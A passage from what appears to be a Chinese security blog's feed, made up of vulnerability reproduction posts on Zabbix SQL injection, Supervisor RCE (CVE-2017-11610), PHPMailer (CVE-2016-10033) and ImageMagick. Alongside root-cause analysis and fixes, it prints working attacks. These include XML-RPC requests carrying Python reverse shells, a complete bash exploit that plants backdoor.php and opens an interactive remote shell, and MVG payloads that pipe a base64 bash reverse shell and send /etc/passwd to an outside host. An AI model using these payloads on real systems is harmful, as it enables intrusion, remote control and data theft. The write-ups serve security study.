$options['profileIdx2']);</code></pre><p>}</p><p>最终调用了Cprofile的update函数。执行了:<code>CProfile::update("web.item.graph.period",options['period'],PROFILE_TYPE_INT,"updatexml(0,concat(0xa,user()),0))"</code>语句。<br>CProfile::update()函数没有直接插入或更新数据，而是检测当前对象是否完成初始化工作，然后检查<code>options['period']</code>的类型，最后将要update的数据添加到CProfile::$update的私有全局数组中(这里会有一个判断，根据$idx和$idx2获取值，如果为空则插入，值不等则更新，找不到$idx则添加self::$profiles[$idx])。执行完操作后，会调用CProfile::flush()便遍历CProfile::$insert和CProfile::$update来执行CProfile::insertDB()和CProfile::updateDB()函数。这里由于<code>$idx2=="updatexml(0,concat(0xa,user()),0))"</code>,所以最终会调用insertDB函数执行插入操作。</p><pre><code>private static function insertDB($idx, $value, $type, $idx2) {    $value_type = self::getFieldByType($type);    $values = [        'profileid' =&gt; get_dbid('profiles', 'profileid'),        'userid' =&gt; self::$userDetails['userid'],        'idx' =&gt; zbx_dbstr($idx),        $value_type =&gt; zbx_dbstr($value),        'type' =&gt; $type,        'idx2' =&gt; $idx2    ];    return DBexecute('INSERT INTO profiles ('.implode(', ', array_keys($values)).') VALUES ('.implode(', ', $values).')');}</code></pre><p>截至目前$idx2没有受到任何过滤，成功传入到DBexecute函数中，报错注入成功。DBexecute()函数就是根据$DB[‘DB’]指定的数据库执行对应的数据库执行函数并返回结果。</p><h4 id="利用latest-php进行注入"><a href="#利用latest-php进行注入" class="headerlink" title="利用latest.php进行注入"></a>利用latest.php进行注入</h4><p>报错注入的语句：</p><pre><code>/latest.php?output=ajax&amp;sid=f9f27bb9a9fc1b5b&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0)</code></pre><p>这个注入点分析较为容易，直接定位到latest.php第70行</p><pre><code>if (hasRequest('favobj')) {    if ($_REQUEST['favobj'] == 'toggle') {        if (!is_array($_REQUEST['toggle_ids'])) {            ...        }        else {            foreach ($_REQUEST['toggle_ids'] as $toggleId) {                if ($toggleId[1] == '_') {                    $hostId = substr($toggleId, 2);                    CProfile::update('web.latest.toggle_other', $_REQUEST['toggle_open_state'], PROFILE_TYPE_INT, $hostId);                }                else {                    $applicationId = $toggleId;                    CProfile::update('web.latest.toggle', $_REQUEST['toggle_open_state'], PROFILE_TYPE_INT, $applicationId);                }            }        }    }}</code></pre><p>由于favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0),会直接执行<code>CProfile::update('web.latest.toggle', 1, PROFILE_TYPE_INT, 'updatexml(0,concat(0xa,user()),0)');</code>,之后的利用链和“利用latest.php进行注入”后面部分致。sid在Clink::toString中赋值，而output=ajax来源于zabbix-3.0.3/frontends/php/include/views/js/monitoring.latest.js.php中的第146行。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/865f8eaba044acdc.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/545f1893d3482b44.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Supervisor Authenticated RCE(CVE-2017-11610)</title>
      <link href="/2020/12/19/supervisor-rce-cve-2017-11610/"/>
      <url>/2020/12/19/supervisor-rce-cve-2017-11610/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Supervisor是用Python开发的一套通用的进程管理程序，能将一个普通的命令行进程变为后台daemon，并监控进程状态，异常退出时能自动重启。它是通过fork/exec的方式把这些被管理的进程当作supervisor的子进程来启动，这样只要在supervisor的配置文件中，把要管理的进程的可执行文件的路径写进去即可。也实现当子进程挂掉的时候，父进程可以准确获取子进程挂掉的信息的，可以选择是否自己启动和报警。supervisor还提供了一个功能，可以为supervisord或者每个子进程，设置一个非root的user，这个user就可以管理它对应的进程。<br>Supervisor可通过web接口管理服务，在配置了web接口后，同时会在服务器启动一个 XMLRPC 服务器，端口为 9001。该接口可配置需要密码访问，或者无需认证访问。</p><h3 id="四个组件"><a href="#四个组件" class="headerlink" title="四个组件"></a>四个组件</h3><ol><li>supervisord<br>运行Supervisor的后台服务，它用来启动和管理那些你需要Supervisor管理的子进程，响应客户端发来的请求，重启意外退出的子进程，将子进程的stdout和stderr写入日志，响应事件等。它是Supervisor最核心的部分。</li><li>supervisorctl<br>相当于supervisord的客户端，它是一个命令行工具，用户可以通过它向supervisord服务发指令，比如查看子进程状态，启动或关闭子进程。它可以连接不同的supervisord服务，包括远程机上的服务。</li><li>Web服务器<br>这是supervisord的Web客户端，用户可以在Web页面上完成类似于supervisorctl的功能。</li><li>XML-RPC接口<br>这是留给第三方集成的接口，你的服务可以在远程调用这些XML-RPC接口来控制supervisord管理的子进程。上面的Web服务器其实也是通过这个XML-RPC接口实现的。<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3>Supervisord 3.1.2 &lt;= Version &lt;= 3.3.2<br>已修复：Supervisord 3.3.3 、Supervisord 3.2.4 、Supervisord 3.1.4 、Supervisord 3.0.1</li></ol><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>环境搭建好，访问127.0.0.1:9001端口，burpsuite发包，即可getshell</p><h4 id="法一（直接利用os-system）"><a href="#法一（直接利用os-system）" class="headerlink" title="法一（直接利用os.system）"></a>法一（直接利用os.system）</h4><pre><code>POST /RPC2 HTTP/1.1Host: localhostAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 275&lt;?xml version="1.0"?&gt;&lt;methodCall&gt;&lt;methodName&gt;supervisor.supervisord.options.warnings.linecache.os.system&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;string&gt;python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.2.140',9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"&lt;/string&gt;    &lt;/param&gt;    &lt;/params&gt;    &lt;/methodCall&gt;</code></pre><p>或者:下面方法实际上调用了os.execve函数使用新进程替代现有进程，会破坏环境</p><h4 id="法二（最初始的利用方法）"><a href="#法二（最初始的利用方法）" class="headerlink" title="法二（最初始的利用方法）"></a>法二（最初始的利用方法）</h4><pre><code>POST /RPC2 HTTP/1.1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/xmlContent-Type: text/xmlAccept-Language: en-GB,en;q=0.5Connection: keep-aliveUpgrade-Insecure-Requests: 1Content-Length: 638Host: 192.168.2.100:9001&lt;?xml version="1.0"?&gt;&lt;methodCall&gt;&lt;methodName&gt;supervisor.supervisord.options.execve&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;string&gt;/usr/bin/python&lt;/string&gt;&lt;/param&gt;&lt;param&gt;&lt;array&gt;&lt;data&gt;&lt;value&gt;&lt;string&gt;python&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/value&gt;&lt;value&gt;&lt;string&gt;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.140",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);&lt;/string&gt;&lt;/value&gt;&lt;/data&gt;&lt;/array&gt;&lt;/param&gt;&lt;param&gt;&lt;struct&gt;&lt;/struct&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;</code></pre><h4 id="法三（vulhub给出的poc）"><a href="#法三（vulhub给出的poc）" class="headerlink" title="法三（vulhub给出的poc）"></a>法三（<a href="https://github.com/vulhub/vulhub/tree/master/supervisor/CVE-2017-11610" target="_blank" rel="noopener">vulhub给出的poc</a>）</h4><p>将命令执行的结果写入log文件中，再调用Supervisord自带的readLog方法读取log文件，将结果读出来。</p><pre><code>#!/usr/bin/env python3# python3 poc.py "http://ip:9001/RPC2" "command"import xmlrpc.clientimport systarget = sys.argv[1]command = sys.argv[2]with xmlrpc.client.ServerProxy(target) as proxy:    old = getattr(proxy, 'supervisor.readLog')(0,0)logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))result = getattr(proxy, 'supervisor.readLog')(0,0)print(result[len(old):])</code></pre><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>漏洞本质是一个不安全对象引用+方法调用，在C/S以RPC协议(远程过程调用协议)的通信的过程中，C端通过RPC调用了S端预料之外的函数，如os.system,由此产生漏洞。<br>一个安全的RPC协议应该有函数映射和白名单机制，只有访问预定的函数时才响应请求。</p><h3 id="漏洞挖掘路线："><a href="#漏洞挖掘路线：" class="headerlink" title="漏洞挖掘路线："></a>漏洞挖掘路线：</h3><p>Supervisord.py </p><pre><code>Supervisor:openhttpservers -&gt; Supervisor:self.options -&gt; Supervisor:__init__ -&gt; go -&gt; main -&gt; ServerOptions -&gt; supervisor.options</code></pre><p>options.py  </p><pre><code>ServerOptions:openhttpservers -&gt; ServerOptions:make_http_servers -&gt; supervisor.http</code></pre><p>http.py </p><pre><code>make_http_servers -&gt; (已知是XML-RPC接口的问题)supervisor_xmlrpc_handler:call -&gt; traverse </code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/394f950772079373.png" alt=""></p><p>其中methods和params是xml文件中的&lt;methodName&gt;和&lt;params&gt;的值，getattr函数能够根据属性名获取属性对象，实际造成的效果就是：</p><ol><li>对&lt;methodName&gt;的值逐个getattr，若成功得到对象func，则return func(params)</li><li>由于有name.startswith(‘_’)的限制，不能访问私有对象，但能够访问所有该对象的public属性及子对象</li><li>如果存在XMLRPC的弱认证，则攻击者可能通过寻找利用链来RCE</li></ol><p>只需找引用了os模块的利用链即可：supervisor.supervisord.options.warnings.linecache.os.system</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>phpmailer(CVE-2016-10033)</title>
      <link href="/2020/12/18/phpmailer-cve-2016-10033/"/>
      <url>/2020/12/18/phpmailer-cve-2016-10033/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>PHPMailer是一个用来发送电子邮件的函数包</p><p>实现发送文件的简短代码：</p><pre><code>// 引入PHPMailer的核心文件require_once("PHPMailer/class.phpmailer.php");require_once("PHPMailer/class.smtp.php");// 实例化PHPMailer核心类$mail = new PHPMailer();// 是否启用smtp的debug进行调试 开发环境建议开启 生产环境注释掉即可 默认关闭debug调试模式$mail-&gt;SMTPDebug = 1;// 使用smtp鉴权方式发送邮件$mail-&gt;isSMTP();// smtp需要鉴权 这个必须是true$mail-&gt;SMTPAuth = true;// 链接qq域名邮箱的服务器地址$mail-&gt;Host = 'smtp.qq.com';// 设置使用ssl加密方式登录鉴权$mail-&gt;SMTPSecure = 'ssl';// 设置ssl连接smtp服务器的远程服务器端口号$mail-&gt;Port = 465;// 设置发送的邮件的编码$mail-&gt;CharSet = 'UTF-8';// 设置发件人昵称 显示在收件人邮件的发件人邮箱地址前的发件人姓名$mail-&gt;FromName = '发件人昵称';// smtp登录的账号 QQ邮箱即可$mail-&gt;Username = '12345678@qq.com';// smtp登录的密码 使用生成的授权码$mail-&gt;Password = '**********';// 设置发件人邮箱地址 同登录账号$mail-&gt;From = '12345678@qq.com';// 邮件正文是否为html编码 注意此处是一个方法$mail-&gt;isHTML(true);// 设置收件人邮箱地址$mail-&gt;addAddress('87654321@qq.com');// 添加多个收件人 则多次调用方法即可$mail-&gt;addAddress('87654321@163.com');// 添加该邮件的主题$mail-&gt;Subject = '邮件主题';// 添加邮件正文$mail-&gt;Body = '&lt;h1&gt;Hello World&lt;/h1&gt;';// 为该邮件添加附件$mail-&gt;addAttachment('./example.pdf');// 发送邮件 返回状态$status = $mail-&gt;send();</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞检测-利用脚本-写webshell"><a href="#漏洞检测-利用脚本-写webshell" class="headerlink" title="漏洞检测/利用脚本-写webshell"></a>漏洞检测/利用脚本-写webshell</h3><p>#!/bin/bash<br>    # CVE-2016-10033 exploit by opsxcq<br>    # <a href="https://github.com/opsxcq/exploit-CVE-2016-10033" target="_blank" rel="noopener">https://github.com/opsxcq/exploit-CVE-2016-10033</a></p><pre><code>echo '[+] CVE-2016-10033 exploit by opsxcq'if [ -z "$1" ]then    echo '[-] Please inform an host as parameter'    exit -1fiif [ $(uname) == 'Darwin' ]then    decoder='base64 -D'elif [ $(uname) == 'Linux' ]then    decoder='base64 -d'  else    echo '[-] Your platform isnt supported: '$(uname)    exit -1fihost=$1echo '[+] Exploiting '$hostcurl -sq 'http://'$host -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe' --data-binary $'------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="action"\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="name"\r\n\r\n&lt;?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?&gt;\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="email"\r\n\r\n\"vuln\\\" -OQueueDirectory=/tmp -X/var/www/html/backdoor.php server\" @t.co\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name="message"\r\n\r\nPwned\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n' &gt;/dev/null &amp;&amp; echo '[+] Target exploited, acessing shell at http://'$host'/backdoor.php'echo '[+] Checking if the backdoor was created on target system'code=$(curl -o /dev/null --silent --head --write-out '%{http_code}\n' "http://$host/backdoor.php")if [ "$code" != "200" ]then    echo '[-] Target cant be exploited'    exit -1else    echo '[+] Backdoor.php found on remote system'ficmd='whoami'while [ "$cmd" != 'exit' ]do    echo '[+] Running '$cmd    if ! curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | base64) | grep '|' | grep -v 'base64_encode' | head -n 1 | cut -d '|' -f 2 | $decoder     then        echo '[-] Connection problens'        exit -1    fi    echo    read -p 'RemoteShell&gt; ' cmddoneecho '[+] Exiting'</code></pre><h3 id="伪造特定发件邮箱-写webshell"><a href="#伪造特定发件邮箱-写webshell" class="headerlink" title="伪造特定发件邮箱-写webshell"></a>伪造特定发件邮箱-写webshell</h3><pre><code>aaa( -X/home/www/success.php )@qq.com</code></pre><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>第一种方法参考于<a href="https://github.com/opsxcq/exploit-CVE-2016-10033" target="_blank" rel="noopener">这里</a>，利用起来条件较为苛刻<br>漏洞点在mail函数的第五个参数：</p><pre><code>// grep -r -n --include "*.php" "mail(.*,.*,.*,.*,.*)" *bool mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] )</code></pre><p>PHP版本低于5.2.0时，没有安装PCRE（正则扩展），因此validateAddress函数中的$patternselect变量会被设置成“noregex”，因此会禁止所有的正则检查而仅作简单验证。同时未开启safe_mode时，$additional_parameters将被使用，此时构造如下exp即可利用成功：</p><pre><code>$to = 'hacker@server.com';$subject = '&lt;?php echo "|".base64_encode(system(base64_decode($_GET["cmd"])))."|"; ?&gt;';$message = 'Pwned';$headers = '';$options = '-OQueueDirectory=/tmp -X/www/backdoor.php';mail($to, $subject, $message, $headers, $options);-X lofile在指定的日志文件中记录所有进出邮件的流量。这仅应作为调试邮件程序错误的最后手段，将快速记录大量数据-C file使用备用配置文件-O option=value将option选项设置为指定值</code></pre><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>第二种方法是看到长亭的一篇文章知道的，就是绕正则<br>首先下载phpmailer，切换到有漏洞的分支</p><pre><code>git clone https://github.com/PHPMailer/PHPMailercd PHPMailergit checkout -b CVE-2016-10033 v5.2.17</code></pre><p>找到进行正则检测的逻辑</p><pre><code>public static function validateAddress($address, $patternselect = null)    {        if (null === $patternselect) {            $patternselect = static::$validator;        }        if (is_callable($patternselect)) {            return call_user_func($patternselect, $address);        }        //Reject line breaks in addresses; it's valid RFC5322, but not RFC5321        if (strpos($address, "\n") !== false || strpos($address, "\r") !== false) {            return false;        }        switch ($patternselect) {            case 'pcre': //Kept for BC            case 'pcre8':                return (bool) preg_match(                    '/^(?!(?&gt;(?1)"?(?&gt;\\\[ -~]|[^"])"?(?1)){255,})(?!(?&gt;(?1)"?(?&gt;\\\[ -~]|[^"])"?(?1)){65,}@)' .                    '((?&gt;(?&gt;(?&gt;((?&gt;(?&gt;(?&gt;\x0D\x0A)?[\t ])+|(?&gt;[\t ]*\x0D\x0A)?[\t ]+)?)(\((?&gt;(?2)' .                    '(?&gt;[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' .                    '([!#-\'*+\/-9=?^-~-]+|"(?&gt;(?2)(?&gt;[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' .                    '(?2)")(?&gt;(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?&gt;([a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)' .                    '(?&gt;(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?&gt;IPv6:(?&gt;([a-f0-9]{1,4})(?&gt;:(?6)){7}' .                    '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?&gt;:(?6)){0,6})?::(?7)?))|(?&gt;(?&gt;IPv6:(?&gt;(?6)(?&gt;:(?6)){5}:' .                    '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?&gt;((?6)(?&gt;:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .                    '|[1-9]?[0-9])(?&gt;\.(?9)){3}))\])(?1)$/isD',                    $address                );            case 'html5':                /*                 * This is the pattern used in the HTML5 spec for validation of 'email' type form input elements.                 *                 * @see https://html.spec.whatwg.org/#e-mail-state-(type=email)                 */                return (bool) preg_match(                    '/^[a-zA-Z0-9.!#$%&amp;\'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' .                    '[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',                    $address                );            case 'php':            default:                return filter_var($address, FILTER_VALIDATE_EMAIL) !== false;        }    }</code></pre><p>这个函数有四个特点：</p><ol><li>默认patternselect==‘auto’，它会自动选择一个方式对email进行检测</li><li>如果php支持正则PCRE（也就是包含preg_replace函数），就用正则的方式来检查，就是那一大串很难读懂的正则</li><li>如果php不支持PCRE，且PHP版本大于PHP5.2.0，就是用PHP自带的filter来检查email</li><li>如果php不支持PCRE，且PHP版本低于PHP5.2.0，就直接检查email中是否包含@</li></ol><p>在第一种方法的利用中，满足第四个特点才能利用成功，但是这个正则并非牢不可破：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/3fcc1826504a5032.png" alt=""></p><blockquote><p>在@前面，如果加上括号，将可以引入空格</p></blockquote><p>找时间好好研究研究555</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ol><li><a href="https://github.com/opsxcq/exploit-CVE-2016-10033" target="_blank" rel="noopener">https://github.com/opsxcq/exploit-CVE-2016-10033</a></li><li><a href="https://blog.chaitin.cn/phpmailer-cve-2016-10033/" target="_blank" rel="noopener">https://blog.chaitin.cn/phpmailer-cve-2016-10033/</a></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ImageMagick系列漏洞</title>
      <link href="/2020/12/18/imagemagick-xi-lie-lou-dong/"/>
      <url>/2020/12/18/imagemagick-xi-lie-lou-dong/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ImageMagick可以创建，编辑，撰写，或转换位图图像。它可以读取和写入各种格式（超过200种）的图像，包括PNG，JPEG，GIF，HEIC，TIFF，DPX，EXR，WebP，Postscript，PDF和SVG。使用ImageMagick可以调整图像大小，翻转，镜像，旋转，变形，剪切和变换图像，调整图像颜色，应用各种特殊效果或绘制文本，线条，多边形，椭圆和贝塞尔曲线。<br>imageMagic中文站：<a href="http://www.imagemagick.com.cn/" target="_blank" rel="noopener">http://www.imagemagick.com.cn/</a></p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>ImageMagick 6.9.3-9 before</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><h4 id="常规利用（利用委托中对https的解析）"><a href="#常规利用（利用委托中对https的解析）" class="headerlink" title="常规利用（利用委托中对https的解析）"></a>常规利用（利用委托中对https的解析）</h4><pre><code>push graphic-contextviewbox 0 0 640 480fill 'url(https://127.0.0.0/oops.jpg"|ls -al /")'pop graphic-contextpush graphic-contextviewbox 0 0 640 480image over 0,0 0,0 'http://192.168.43.26/demo.php?x=`cat /etc/passwd `'pop graphic-contextpush graphic-contextviewbox 0 0 640 480fill 'url(https://127.0.0.1/demo.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDMuMjYvOTk5OSAwPiYx | base64 -d | bash`"||id " )'pop graphic-context</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/feae72f8529073c0.png" alt=""></p><h4 id="受限利用（利用委托中对miff的解析）"><a href="#受限利用（利用委托中对miff的解析）" class="headerlink" title="受限利用（利用委托中对miff的解析）"></a>受限利用（利用委托中对miff的解析）</h4><pre><code>exiftool -label="\"|/usr/bin/id; \"" test.pngconvert test.png o.show</code></pre><p>但由于此条委托中设定encode=show，因此只有将图片转换成.show文件时才能触发，test.png可为普通文件<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/858f247cd37a8163.png" alt=""></p><h3 id="CVE-2016-3715"><a href="#CVE-2016-3715" class="headerlink" title="CVE-2016-3715"></a>CVE-2016-3715</h3><p>利用ImageMagick对ephemeral协议的支持删除任意文件</p><pre><code>push graphic-contextviewbox 0 0 640 480image over 0,0 0,0 'ephemeral:/tmp/delete.txt'popgraphic-context</code></pre><h3 id="CVE-2016-3716"><a href="#CVE-2016-3716" class="headerlink" title="CVE-2016-3716"></a>CVE-2016-3716</h3><p>利用ImageMagick对msl协议的支持，来进行文件的读取和写入，借此可以将任意格式文件写为php/jsp，构造webshell。先创建msl.txt，后使用msl协议解析</p><pre><code># file_move.mvgpush graphic-contextviewbox 0 0 640 480image over 0,0 0,0 'msl:/tmp/msl.txt'popgraphic-context# /tmp/msl.txt&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;image&gt;&lt;read filename="/tmp/image.gif" /&gt;&lt;write filename="/var/www/shell.php" /&gt;&lt;/image&gt;</code></pre><h3 id="CVE-2016-3717"><a href="#CVE-2016-3717" class="headerlink" title="CVE-2016-3717"></a>CVE-2016-3717</h3><p>本地文件读取漏洞</p><pre><code>push graphic-contextviewbox 0 0 640 480image over 0,0 0,0 'label:@/etc/hosts'pop graphic-context$ convert file_read.mvg out.png</code></pre><h3 id="CVE-2016-3718"><a href="#CVE-2016-3718" class="headerlink" title="CVE-2016-3718"></a>CVE-2016-3718</h3><p>由于mvg可以包含url，借此发起SSRF攻击</p><pre><code>push graphic-conbntextviewbox 0 0 640 480fill 'url(http://example.com/)'pop graphic-context$ convert ssrf.mvg out.png # makes http request to example.co</code></pre><h3 id="利用工具："><a href="#利用工具：" class="headerlink" title="利用工具："></a>利用工具：</h3><p>burpsuite插件：<a href="https://github.com/silentsignal/burp-image-size/releases/download/v0.3/burp-image-size-v0.3-java1.6.jar" target="_blank" rel="noopener">https://github.com/silentsignal/burp-image-size/releases/download/v0.3/burp-image-size-v0.3-java1.6.jar</a><br>metasploit：use exploits/unix/fileformat/imagemagick_delegate</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ImageMagick有一个委托（delegate）功能，使用system函数调用外部lib来处理文件，如处理https协议的文件时会调用wget请求文件。定义委托规则的文件叫<a href="https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L99" target="_blank" rel="noopener">delegate.xml</a>。<br>将html标签反转义：（有漏洞版本的委托程序是curl，当前版本换成wget以fix bug）</p><pre><code>&lt;delegate decode=\"https\" command=\"&amp;quot;wget&amp;quot; -q -O &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;\"/&gt;"&lt;delegate decode=\"https\" command=\""wget" -q -O "%o" "https:%M"\"/&gt;"</code></pre><p>可见，imagemagic程序解析https资源文件时，若使用curl先保存文件，其中命令直接渲染到<code>%M</code>处，因此产生命令注入漏洞。ImageMagic默认支持mvg格式的图片，此格式以文本形式写入矢量图的内容，即便文件后缀部位mvg，imageMagic也会根据被容识别并处理，因此构造mvg格式的文本可实现常规利用：</p><pre><code>push graphic-contextviewbox 0 0 640 480fill 'url(https://"|id; ")'pop graphic-context</code></pre><p>类似的，另一个miff格式的委托规则也存在此问题，但由于限定encode=show，因此利用受限。</p><pre><code>&lt;delegate decode="miff" encode="show" spawn="True" command="&amp;quot;/usr/bin/display&amp;quot; -delay 0 -window-group %[group] -title &amp;quot;%l &amp;quot; &amp;quot;ephemeral:%i&amp;quot;"/&gt;&lt;delegate decode="miff" encode="show" spawn="True" command=""/usr/bin/display" -delay 0 -window-group %[group] -title "%l " "ephemeral:%i""/&gt;exiftool -label="\"|/usr/bin/id; \"" test.pngconvert test.png o.show</code></pre><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol><li><p>限制委托功能，检查图片头，如果格式非预期就写函数处理而不用imagemagick处理，php中可以使用getimagesize函数检查格式</p></li><li><p>使用policy file防御此漏洞，可配置policy.xml文件禁止敏感操作</p><pre><code>&lt;policymap&gt;&lt;policy domain="coder" rights="none" pattern="EPHEMERAL" /&gt;&lt;policy domain="coder" rights="none" pattern="URL" /&gt;&lt;policy domain="coder" rights="none" pattern="HTTPS" /&gt;&lt;policy domain="coder" rights="none" pattern="MVG" /&gt;&lt;policy domain="coder" rights="none" pattern="MSL" /&gt;&lt;/policymap&gt; </code></pre></li></ol><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><ol><li><a href="https://imagetragick.com/" target="_blank" rel="noopener">https://imagetragick.com/</a></li><li><a href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a></li><li><a href="https://www.secpulse.com/archives/57126.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/57126.html</a></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>一句话下载</title>
      <link href="/2020/12/09/payload-xia-zai-ji-qiao/"/>
